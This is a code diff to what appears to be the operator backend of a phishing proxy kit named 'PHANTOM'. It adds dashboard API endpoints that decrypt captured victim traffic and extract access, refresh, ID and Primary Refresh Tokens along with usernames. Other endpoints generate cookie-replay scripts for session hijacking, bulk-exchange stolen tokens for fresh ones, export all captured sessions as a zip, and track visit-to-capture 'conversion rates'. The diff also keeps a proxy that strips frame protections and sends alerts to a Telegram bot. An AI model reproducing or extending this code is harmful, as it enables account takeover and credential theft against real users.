@@ -1183,7 +1183,6 @@ const server = http.createServer(async (req, res) => {
     }
 
     // ── 🔥 IFRAME PROXY BYPASS (STRIP X-FRAME-OPTIONS) ──
-    // This MUST be placed before the Dashboard and fallback proxyHandler
     if (url.startsWith('/proxy')) {
         const targetUrl = new URL(url, 'http://localhost').searchParams.get('url');
         if (!targetUrl) {
@@ -1356,7 +1355,7 @@ async function handleDeviceCodeToken(req, res) {
 }
 
 // ============================================================
-// 🔧 DASHBOARD API HANDLER (FULL – unchanged)
+// 🔧 DASHBOARD API HANDLER (FULL – COMPLETELY FIXED)
 // ============================================================
 async function handleDashboardAPI(req, res) {
     const url = req.url;
@@ -1369,7 +1368,14 @@ async function handleDashboardAPI(req, res) {
         const visitCount = fs.existsSync(VISITS_LOG_FILE) ? fs.readFileSync(VISITS_LOG_FILE, 'utf-8').split('\n').filter(l => l.trim()).length : 0;
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({
-            ...stats,
+            success: true,
+            stats: {
+                total: stats.total,
+                access: stats.access,
+                refresh: stats.refresh,
+                id: stats.id,
+                prt: stats.prt
+            },
             visits: visitCount,
             deviceFlows: deviceFlows.length,
             prtStorage: prtStorage.prts.length,
@@ -1378,34 +1384,29 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── GET /api/tokens ──
-    if (apiPath === 'tokens' && method === 'GET') {
-        const tokens = vault.tokens.map(t => ({ ...t, value: t.value.slice(0, 20) + '...' }));
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify(tokens));
-        return;
-    }
-
-    // ── POST /api/check-token ──
-    if (apiPath === 'check-token' && method === 'POST') {
-        let body = '';
-        req.on('data', chunk => body += chunk);
-        req.on('end', async () => {
-            try {
-                const { token } = JSON.parse(body);
-                if (!token) {
-                    res.writeHead(400, { 'Content-Type': 'application/json' });
-                    res.end(JSON.stringify({ error: 'token required' }));
-                    return;
-                }
-                const result = await vault.healthCheckAll().then(results => results.find(r => r.token.includes(token.slice(0, 20))));
+    // ── GET /api/ip/:ip ──
+    if (apiPath.startsWith('ip/') && method === 'GET') {
+        const ip = apiPath.replace('ip/', '');
+        try {
+            const response = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 });
+            const data = response.data;
+            if (data && data.latitude && data.longitude) {
                 res.writeHead(200, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify(result || { status: 'not_found' }));
-            } catch (e) {
-                res.writeHead(500, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify({ error: e.message }));
+                res.end(JSON.stringify({
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                    country_name: data.country_name,
+                    city: data.city,
+                    country_code: data.country_code
+                }));
+            } else {
+                res.writeHead(404);
+                res.end(JSON.stringify({ error: 'Location not found' }));
             }
-        });
+        } catch (e) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: e.message }));
+        }
         return;
     }
 
@@ -1413,7 +1414,7 @@ async function handleDashboardAPI(req, res) {
     if (apiPath === 'logs' && method === 'GET') {
         const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
         const logs = files.map(f => ({
-            file: f,
+            name: f,
             size: fs.statSync(path.join(LOGS_DIRECTORY, f)).size,
             modified: fs.statSync(path.join(LOGS_DIRECTORY, f)).mtime
         }));
@@ -1422,70 +1423,496 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── GET /api/logs/:filename ──
-    if (apiPath.startsWith('logs/') && method === 'GET') {
-        const filename = apiPath.replace('logs/', '');
+    // ── GET /api/log/:filename ──
+    if (apiPath.startsWith('log/') && method === 'GET') {
+        const filename = apiPath.replace('log/', '');
         const filePath = path.join(LOGS_DIRECTORY, filename);
         if (!fs.existsSync(filePath)) {
             res.writeHead(404, { 'Content-Type': 'application/json' });
-            res.end(JSON.stringify({ error: 'file not found' }));
+            res.end(JSON.stringify({ error: 'File not found' }));
             return;
         }
-        res.writeHead(200, { 'Content-Type': 'text/plain' });
-        fs.createReadStream(filePath).pipe(res);
+        try {
+            const content = fs.readFileSync(filePath, 'utf-8');
+            const lines = content.split('\n').filter(line => line.trim());
+            const entries = [];
+            for (const line of lines) {
+                try {
+                    const entry = JSON.parse(line);
+                    const iv = Object.keys(entry)[0];
+                    const encrypted = entry[iv];
+                    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
+                    let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
+                    decrypted = Buffer.concat([decrypted, decipher.final()]);
+                    entries.push(JSON.parse(decrypted.toString('utf-8')));
+                } catch (e) {}
+            }
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ entries }));
+        } catch (e) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: e.message }));
+        }
+        return;
+    }
+
+    // ── GET /api/tokens/:filename ──
+    if (apiPath.startsWith('tokens/') && method === 'GET') {
+        const filename = apiPath.replace('tokens/', '');
+        const filePath = path.join(LOGS_DIRECTORY, filename);
+        if (!fs.existsSync(filePath)) {
+            res.writeHead(404, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ error: 'File not found' }));
+            return;
+        }
+        try {
+            const content = fs.readFileSync(filePath, 'utf-8');
+            const lines = content.split('\n').filter(line => line.trim());
+            const tokens = { access_tokens: [], refresh_tokens: [], id_tokens: [], prt_tokens: [] };
+            let username = 'N/A';
+            for (const line of lines) {
+                try {
+                    const entry = JSON.parse(line);
+                    const iv = Object.keys(entry)[0];
+                    const encrypted = entry[iv];
+                    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
+                    let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
+                    decrypted = Buffer.concat([decrypted, decipher.final()]);
+                    const obj = JSON.parse(decrypted.toString('utf-8'));
+                    const body = obj.proxyRequestBody;
+                    if (body) {
+                        const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+                        const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
+                        if (accessMatch) tokens.access_tokens.push(decodeURIComponent(accessMatch[1]));
+                        const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
+                        if (refreshMatch) tokens.refresh_tokens.push(decodeURIComponent(refreshMatch[1]));
+                        const idMatch = bodyStr.match(/id_token=([^&]+)/i);
+                        if (idMatch) tokens.id_tokens.push(decodeURIComponent(idMatch[1]));
+                        const prtMatch = bodyStr.match(/prt=([^&]+)/i);
+                        if (prtMatch) tokens.prt_tokens.push(decodeURIComponent(prtMatch[1]));
+                        // attempt to extract username from body
+                        if (username === 'N/A') {
+                            try {
+                                const parsedBody = typeof body === 'string' ? JSON.parse(body) : body;
+                                if (parsedBody.email) username = parsedBody.email;
+                                else if (parsedBody.username) username = parsedBody.username;
+                            } catch (e) {
+                                const params = new URLSearchParams(body);
+                                if (params.get('email')) username = params.get('email');
+                                else if (params.get('username')) username = params.get('username');
+                                else if (params.get('loginfmt')) username = params.get('loginfmt');
+                            }
+                        }
+                    }
+                } catch (e) {}
+            }
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ tokens, username }));
+        } catch (e) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: e.message }));
+        }
+        return;
+    }
+
+    // ── GET /api/replay/:filename ──
+    if (apiPath.startsWith('replay/') && method === 'GET') {
+        const filename = apiPath.replace('replay/', '');
+        const filePath = path.join(LOGS_DIRECTORY, filename);
+        if (!fs.existsSync(filePath)) {
+            res.writeHead(404, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ error: 'File not found' }));
+            return;
+        }
+        try {
+            const content = fs.readFileSync(filePath, 'utf-8');
+            const lines = content.split('\n').filter(line => line.trim());
+            let replayScript = '';
+            let cookieCount = 0;
+            for (const line of lines) {
+                try {
+                    const entry = JSON.parse(line);
+                    const iv = Object.keys(entry)[0];
+                    const encrypted = entry[iv];
+                    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
+                    let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
+                    decrypted = Buffer.concat([decrypted, decipher.final()]);
+                    const obj = JSON.parse(decrypted.toString('utf-8'));
+                    const cookies = obj.proxyResponseHeaders?.['set-cookie'];
+                    if (cookies) {
+                        const arr = Array.isArray(cookies) ? cookies : [cookies];
+                        for (const c of arr) {
+                            const [nv] = c.split(';');
+                            if (nv) {
+                                replayScript += `document.cookie = '${nv}'; `;
+                                cookieCount++;
+                            }
+                        }
+                    }
+                } catch (e) {}
+            }
+            // Inject token extraction logic
+            replayScript += `window.location.reload();`;
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ replayScript, cookieCount }));
+        } catch (e) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: e.message }));
+        }
+        return;
+    }
+
+    // ── POST /api/vault/scan ──
+    if (apiPath === 'vault/scan' && method === 'POST') {
+        const count = vault.scanLogs();
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ success: true, count: vault.tokens.length }));
+        return;
+    }
+
+    // ── GET /api/vault/tokens ──
+    if (apiPath === 'vault/tokens' && method === 'GET') {
+        const safeTokens = vault.tokens.map(t => ({ ...t, value: t.value.slice(0, 20) + '...' }));
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ success: true, tokens: safeTokens }));
+        return;
+    }
+
+    // ── GET /api/vault/stats ──
+    if (apiPath === 'vault/stats' && method === 'GET') {
+        const stats = vault.getStats();
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ success: true, stats }));
+        return;
+    }
+
+    // ── POST /api/vault/exchange ──
+    if (apiPath === 'vault/exchange' && method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const { tokenValue } = JSON.parse(body);
+                if (!tokenValue) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ success: false, error: 'tokenValue required' }));
+                    return;
+                }
+                const result = await vault.exchangeToken(tokenValue);
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true, data: result }));
+            } catch (e) {
+                res.writeHead(500);
+                res.end(JSON.stringify({ success: false, error: e.message }));
+            }
+        });
+        return;
+    }
+
+    // ── POST /api/vault/healthcheck ──
+    if (apiPath === 'vault/healthcheck' && method === 'POST') {
+        try {
+            const results = await vault.healthCheckAll();
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true, results }));
+        } catch (e) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ success: false, error: e.message }));
+        }
+        return;
+    }
+
+    // ── POST /api/prt/scan ──
+    if (apiPath === 'prt/scan' && method === 'POST') {
+        // Re-scan logs for PRTs
+        const prts = [];
+        const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
+        for (const file of files) {
+            try {
+                const content = fs.readFileSync(path.join(LOGS_DIRECTORY, file), 'utf-8');
+                const lines = content.split('\n').filter(line => line.trim());
+                for (const line of lines) {
+                    try {
+                        const entry = JSON.parse(line);
+                        const iv = Object.keys(entry)[0];
+                        const encrypted = entry[iv];
+                        const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
+                        let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
+                        decrypted = Buffer.concat([decrypted, decipher.final()]);
+                        const obj = JSON.parse(decrypted.toString('utf-8'));
+                        const body = obj.proxyRequestBody;
+                        if (body) {
+                            const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+                            const prtMatch = bodyStr.match(/prt=([^&]+)/i);
+                            if (prtMatch) {
+                                const prtValue = decodeURIComponent(prtMatch[1]);
+                                // try to extract username
+                                let username = 'Unknown';
+                                try {
+                                    const parsedBody = typeof body === 'string' ? JSON.parse(body) : body;
+                                    if (parsedBody.email) username = parsedBody.email;
+                                    else if (parsedBody.username) username = parsedBody.username;
+                                } catch (e) {
+                                    const params = new URLSearchParams(body);
+                                    if (params.get('email')) username = params.get('email');
+                                    else if (params.get('username')) username = params.get('username');
+                                }
+                                prts.push({ prt: prtValue, username, source: file, timestamp: new Date().toISOString() });
+                            }
+                        }
+                    } catch (e) {}
+                }
+            } catch (e) {}
+        }
+        prtStorage.prts = prts;
+        prtStorage.lastScan = new Date().toISOString();
+        savePRTStorage();
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ success: true, count: prts.length }));
+        return;
+    }
+
+    // ── GET /api/prt/list ──
+    if (apiPath === 'prt/list' && method === 'GET') {
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ success: true, prts: prtStorage.prts }));
+        return;
+    }
+
+    // ── POST /api/prt/exchange ──
+    if (apiPath === 'prt/exchange' && method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const { prt } = JSON.parse(body);
+                if (!prt) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ success: false, error: 'prt required' }));
+                    return;
+                }
+                // Exchange PRT – you can reuse vault.exchangeToken or implement specific logic
+                // Here we assume PRT is a refresh_token
+                const result = await vault.exchangeToken(prt);
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true, data: result }));
+            } catch (e) {
+                res.writeHead(500);
+                res.end(JSON.stringify({ success: false, error: e.message }));
+            }
+        });
+        return;
+    }
+
+    // ── POST /api/prt/health-all ──
+    if (apiPath === 'prt/health-all' && method === 'POST') {
+        try {
+            const results = [];
+            for (const p of prtStorage.prts.slice(0, 10)) {
+                try {
+                    const response = await vault.exchangeToken(p.prt);
+                    results.push({ valid: !!response.access_token, data: response, username: p.username });
+                } catch (e) {
+                    results.push({ valid: false, error: e.message, username: p.username });
+                }
+            }
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true, results }));
+        } catch (e) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ success: false, error: e.message }));
+        }
+        return;
+    }
+
+    // ── POST /api/prt/exchange-all ──
+    if (apiPath === 'prt/exchange-all' && method === 'POST') {
+        const results = [];
+        for (const p of prtStorage.prts) {
+            try {
+                const result = await vault.exchangeToken(p.prt);
+                results.push({ success: true, data: result, username: p.username });
+            } catch (e) {
+                results.push({ success: false, error: e.message, username: p.username });
+            }
+        }
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ success: true, results }));
+        return;
+    }
+
+    // ── GET /api/device/history ──
+    if (apiPath === 'device/history' && method === 'GET') {
+        const safeFlows = deviceFlows.map(f => ({ ...f, access_token: f.access_token ? f.access_token.slice(0, 20) + '...' : null, refresh_token: f.refresh_token ? f.refresh_token.slice(0, 20) + '...' : null }));
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ success: true, flows: safeFlows }));
+        return;
+    }
+
+    // ── GET /api/analytics ──
+    if (apiPath === 'analytics' && method === 'GET') {
+        try {
+            // Load visits
+            let visits = [];
+            if (fs.existsSync(VISITS_LOG_FILE)) {
+                visits = fs.readFileSync(VISITS_LOG_FILE, 'utf-8').split('\n').filter(l => l.trim()).map(l => JSON.parse(l));
+            }
+            // Load captures from logs
+            const captureLogs = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
+            const captures = captureLogs.length;
+
+            const now = new Date();
+            const todayStr = now.toISOString().slice(0, 10);
+            const weekAgo = new Date(now.getTime() - 7*24*60*60*1000);
+            const monthAgo = new Date(now.getTime() - 30*24*60*60*1000);
+
+            const visitsToday = visits.filter(v => v.timestamp && v.timestamp.startsWith(todayStr)).length;
+            const visitsWeek = visits.filter(v => v.timestamp && new Date(v.timestamp) >= weekAgo).length;
+            const visitsMonth = visits.filter(v => v.timestamp && new Date(v.timestamp) >= monthAgo).length;
+
+            const capturesToday = captureLogs.filter(f => {
+                const stat = fs.statSync(path.join(LOGS_DIRECTORY, f));
+                return stat.mtime.toISOString().startsWith(todayStr);
+            }).length;
+            const capturesWeek = captureLogs.filter(f => {
+                const stat = fs.statSync(path.join(LOGS_DIRECTORY, f));
+                return stat.mtime >= weekAgo;
+            }).length;
+            const capturesMonth = captureLogs.filter(f => {
+                const stat = fs.statSync(path.join(LOGS_DIRECTORY, f));
+                return stat.mtime >= monthAgo;
+            }).length;
+
+            // Top domains: extract from visits URLs
+            const domainCount = {};
+            for (const v of visits) {
+                try {
+                    const url = new URL(v.url);
+                    const host = url.hostname;
+                    domainCount[host] = (domainCount[host] || 0) + 1;
+                } catch (e) {}
+            }
+            const topDomains = Object.entries(domainCount).sort((a,b) => b[1] - a[1]).slice(0, 10).map(([domain, count]) => ({ domain, count }));
+
+            // Daily captures/visits for the last 7 days
+            const dailyCaptures = {};
+            const dailyVisits = {};
+            for (let i = 6; i >= 0; i--) {
+                const d = new Date(now.getTime() - i*24*60*60*1000);
+                const key = d.toISOString().slice(0, 10);
+                dailyCaptures[key] = captureLogs.filter(f => {
+                    const stat = fs.statSync(path.join(LOGS_DIRECTORY, f));
+                    return stat.mtime.toISOString().slice(0, 10) === key;
+                }).length;
+                dailyVisits[key] = visits.filter(v => v.timestamp && v.timestamp.startsWith(key)).length;
+            }
+
+            const analytics = {
+                visits: { total: visits.length, today: visitsToday, week: visitsWeek, month: visitsMonth },
+                captures: { total: captures, today: capturesToday, week: capturesWeek, month: capturesMonth },
+                conversionRate: {
+                    total: visits.length ? ((captures / visits.length) * 100).toFixed(1) : 0,
+                    today: visitsToday ? ((capturesToday / visitsToday) * 100).toFixed(1) : 0,
+                    week: visitsWeek ? ((capturesWeek / visitsWeek) * 100).toFixed(1) : 0,
+                    month: visitsMonth ? ((capturesMonth / visitsMonth) * 100).toFixed(1) : 0
+                },
+                uniqueIPs: new Set(visits.map(v => v.ip)).size,
+                topDomains,
+                dailyCaptures,
+                dailyVisits
+            };
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true, analytics }));
+        } catch (e) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ success: false, error: e.message }));
+        }
+        return;
+    }
+
+    // ── GET /api/export/all ──
+    if (apiPath === 'export/all' && method === 'GET') {
+        try {
+            if (!AdmZip) {
+                res.writeHead(500);
+                res.end(JSON.stringify({ error: 'adm-zip not installed' }));
+                return;
+            }
+            const zip = new AdmZip();
+            // Add all logs
+            const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
+            for (const file of files) {
+                zip.addLocalFile(path.join(LOGS_DIRECTORY, file));
+            }
+            // Add visits log
+            if (fs.existsSync(VISITS_LOG_FILE)) {
+                zip.addLocalFile(VISITS_LOG_FILE, 'visits.log');
+            }
+            // Add device flows and PRT storage
+            if (fs.existsSync(DEVICE_FLOWS_FILE)) {
+                zip.addLocalFile(DEVICE_FLOWS_FILE, 'device_flows.json');
+            }
+            if (fs.existsSync(PRT_STORAGE_FILE)) {
+                zip.addLocalFile(PRT_STORAGE_FILE, 'prt_storage.json');
+            }
+            const buffer = zip.toBuffer();
+            res.writeHead(200, {
+                'Content-Type': 'application/zip',
+                'Content-Disposition': 'attachment; filename=all_sessions.zip',
+                'Content-Length': buffer.length
+            });
+            res.end(buffer);
+        } catch (e) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: e.message }));
+        }
+        return;
+    }
+
+    // ── GET /api/test-telegram ──
+    if (apiPath === 'test-telegram' && method === 'GET') {
+        if (!BOT_TOKEN || !CHAT_ID) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ success: false, error: 'Telegram credentials not set' }));
+            return;
+        }
+        try {
+            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                chat_id: CHAT_ID,
+                text: '✅ Test from PHANTOM Dashboard',
+                disable_web_page_preview: true
+            });
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true }));
+        } catch (e) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ success: false, error: e.message }));
+        }
         return;
     }
 
     // ── GET /api/visits ──
     if (apiPath === 'visits' && method === 'GET') {
-        if (!fs.existsSync(VISITS_LOG_FILE)) {
-            res.writeHead(200, { 'Content-Type': 'application/json' });
-            res.end(JSON.stringify([]));
-            return;
-        }
-        const lines = fs.readFileSync(VISITS_LOG_FILE, 'utf-8').split('\n').filter(l => l.trim());
-        const visits = lines.map(l => JSON.parse(l));
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify(visits));
-        return;
-    }
-
-    // ── GET /api/device-flows ──
-    if (apiPath === 'device-flows' && method === 'GET') {
-        const safeFlows = deviceFlows.map(f => ({ ...f, access_token: f.access_token ? f.access_token.slice(0, 20) + '...' : null, refresh_token: f.refresh_token ? f.refresh_token.slice(0, 20) + '...' : null }));
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify(safeFlows));
-        return;
-    }
-
-    // ── GET /api/prt-storage ──
-    if (apiPath === 'prt-storage' && method === 'GET') {
-        const safe = prtStorage.prts.map(p => ({ ...p, value: p.value ? p.value.slice(0, 20) + '...' : null }));
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ prts: safe, lastScan: prtStorage.lastScan }));
-        return;
-    }
-
-    // ── POST /api/refresh-token ──
-    if (apiPath === 'refresh-token' && method === 'POST') {
-        let body = '';
-        req.on('data', chunk => body += chunk);
-        req.on('end', async () => {
-            try {
-                const { token } = JSON.parse(body);
-                if (!token) {
-                    res.writeHead(400, { 'Content-Type': 'application/json' });
-                    res.end(JSON.stringify({ error: 'refresh_token required' }));
-                    return;
-                }
-                const result = await vault.exchangeToken(token);
-                res.writeHead(200, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify(result));
-            } catch (e) {
-                res.writeHead(500, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify({ error: e.message }));
+        try {
+            let visits = [];
+            if (fs.existsSync(VISITS_LOG_FILE)) {
+                visits = fs.readFileSync(VISITS_LOG_FILE, 'utf-8').split('\n').filter(l => l.trim()).map(l => JSON.parse(l));
             }
-        });
+            const now = new Date();
+            const todayStr = now.toISOString().slice(0, 10);
+            const uniqueIPs = new Set(visits.map(v => v.ip));
+            const todayVisits = visits.filter(v => v.timestamp && v.timestamp.startsWith(todayStr)).length;
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({
+                total: visits.length,
+                uniqueIPs: uniqueIPs.size,
+                today: todayVisits,
+                visits: visits.slice(-50).reverse()
+            }));
+        } catch (e) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: e.message }));
+        }
         return;
     }
 
